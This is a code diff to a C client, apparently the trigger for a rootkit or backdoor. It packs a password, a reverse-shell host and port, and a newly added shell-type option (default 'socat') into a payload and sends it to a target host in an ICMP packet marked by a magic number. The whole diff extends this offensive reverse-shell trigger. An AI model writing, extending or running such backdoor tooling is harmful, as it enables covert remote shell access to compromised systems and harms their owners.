@@ -171,7 +171,8 @@ free_buffer:
 }
 
 int main(int argc, char *argv[]) {
-  char *srcip = "127.0.0.1", *dstip, *pass, *rev_host, *rev_port, *data;
+  char *srcip = "127.0.0.1", *shell_t = "socat", *dstip, *pass, *rev_host,
+       *rev_port, *data;
   int opt, magic_number;
   pid_t pid;
 
@@ -183,7 +184,7 @@ int main(int argc, char *argv[]) {
     exit(-1);
   }
 
-  while ((opt = getopt(argc, argv, "p:l:k:s:m:vq")) != EOF) {
+  while ((opt = getopt(argc, argv, "p:l:k:s:m:t:vq")) != EOF) {
     switch (opt) {
       case 'p':
         if (atoi(optarg) < 0 || atoi(optarg) > 65535) {
@@ -218,6 +219,9 @@ int main(int argc, char *argv[]) {
       case 'q':
         just_send_packet = true;
         break;
+      case 't':
+        shell_t = optarg;
+        break;
       default:
         usage(argv[0]);
         break;
@@ -227,11 +231,12 @@ int main(int argc, char *argv[]) {
   if (srcip == NULL || dstip == NULL || pass == NULL) usage(argv[0]);
   if (magic_number == 0) usage(argv[0]);
 
-  int len = strlen(pass) + strlen(rev_host) + strlen(rev_port) + 3;
+  int len =
+      strlen(pass) + strlen(rev_host) + strlen(rev_port) + strlen(shell_t) + 4;
   data = (char *)malloc(len * sizeof(char));
 
   bzero(data, len);
-  snprintf(data, len, "%s %s %s", pass, rev_host, rev_port);
+  snprintf(data, len, "%s %s %s %s", pass, rev_host, rev_port, shell_t);
 
   if (just_send_packet) {
     icmp(srcip, dstip, magic_number, data);
